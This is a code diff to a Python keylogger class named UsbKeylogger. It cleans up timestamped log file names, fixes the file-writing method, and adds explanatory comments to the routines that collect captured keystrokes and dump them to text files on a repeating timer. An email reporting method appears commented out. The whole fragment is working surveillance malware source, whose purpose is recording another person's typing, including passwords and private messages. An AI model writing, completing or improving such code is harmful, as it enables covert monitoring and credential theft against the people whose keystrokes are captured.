@@ -21,13 +21,13 @@ class UsbKeylogger:
         self.keylog = "" # Creates a global string variable named keylog to store the keylogs, which will only store keylogs of the set report interval.
 
     def createFileIdentifier(self):
-        startTime = str(self.startTimeVal) # Creates a string variable from the start time of the keylog interval
-        endTime = str(self.endTimeVal) # Creates a string variable from the end time of the keylog interval
-        self.fileIndentifier = f"Log: {startTime} to {endTime}" # Sets the file name to "Log start time to end time"
+        startTime = str(self.startTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the start time of the keylog interval
+        endTime = str(self.endTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the end time of the keylog interval
+        self.fileIndentifier = f"Log = {startTime} to {endTime}" # Sets the file name to "Log start time to end time"
 
     def reportFile(self):
-        fileIdentifierStr = "{self.fileIndentifier}.txt" # Creates a string variable from the file identifier variable
-        with open(f"{fileIdentifierStr}", "w") as f: # Opens a file of the name from createFileIdentifier
+        #fileIdentifierStr = "{self.fileIndentifier}.txt" # Creates a string variable from the file identifier variable
+        with open(f"{self.fileIndentifier}.txt", "w") as f: # Opens a file of the name from createFileIdentifier
             print(self.keylog, file = f) # Print the contents of a variable (self.keylog) to a file
 
     #def reportEmail(self):
@@ -47,19 +47,19 @@ class UsbKeylogger:
                 eventName = " " # Replaces [SPACE] with " " for readability
             elif eventName == "decimal":
                 eventName = "." # Replaces [DECIMAL] with "." for readability
-        self.keylog = self.keylog + eventName
+        self.keylog = self.keylog + eventName # Updates the self.keylog variable with the eventName
 
     def reportKeyLog(self):
-        if self.keylog:
-            self.endTimeVal = datetime.now()
-            self.createFileIdentifier()
+        if self.keylog: # Checks if self.keylong contains any data and execute the below statements if it does
+            self.endTimeVal = datetime.now() # Retrieves the end datetime for utilization in file identifying
+            self.createFileIdentifier() # Execute the function that creates the file id/name
             if self.reportType == "File":
-                self.reportFile()
-            self.startTimeVal = datetime.now()
+                self.reportFile() # Calls the reportFile method to create a file for keylog recording
+            self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
         self.keylog = ""
-        logTimer = Timer(interval = self.reportInterval, function = self.reportKeyLog)
-        logTimer.daemon = True
-        logTimer.start()
+        logTimer = Timer(interval = self.reportInterval, function = self.reportKeyLog) # Creates a timer for the keylog and takes the specificed reportInterval as a parameter
+        logTimer.daemon = True # The timer thread is now a daemon, which means that it will die off when the main thread dies
+        logTimer.start() # Starts the timer thread
 
     def start(self):
         self.startTimeVal = datetime.now()
